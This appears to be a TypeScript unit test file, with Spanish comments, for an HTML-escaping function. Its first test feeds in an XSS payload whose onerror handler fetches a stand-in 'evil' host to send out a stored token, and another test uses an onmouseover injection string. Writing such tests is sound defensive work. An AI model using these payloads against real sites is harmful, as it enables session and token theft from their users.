import assert from "node:assert/strict";
import { test } from "node:test";
import { escapeHtml } from "./escapeHtml.ts";

test("neutraliza etiquetas HTML y scripts", () => {
  const payload = `</strong><img src=x onerror=fetch('https://evil/?t='+localStorage.enci_token)>`;
  const out = escapeHtml(payload);
  assert.ok(!out.includes("<"), "no debe quedar ningun '<' sin escapar");
  assert.ok(!out.includes(">"), "no debe quedar ningun '>' sin escapar");
  assert.ok(out.includes("&lt;img"));
});

test("escapa comillas para no romper atributos", () => {
  assert.equal(escapeHtml(`" onmouseover="alert(1)`), "&quot; onmouseover=&quot;alert(1)");
  assert.equal(escapeHtml("it's"), "it&#39;s");
});

test("escapa el ampersand primero (sin doble escape de las entidades nuevas)", () => {
  assert.equal(escapeHtml("a & b"), "a &amp; b");
  assert.equal(escapeHtml("<b>"), "&lt;b&gt;");
});

test("tolera null, undefined y numeros", () => {
  assert.equal(escapeHtml(null), "");
  assert.equal(escapeHtml(undefined), "");
  assert.equal(escapeHtml(42), "42");
});

test("deja intacto el texto normal (incluye tildes y enie)", () => {
  assert.equal(escapeHtml("Regulación SAG — Año 2026"), "Regulación SAG — Año 2026");
});
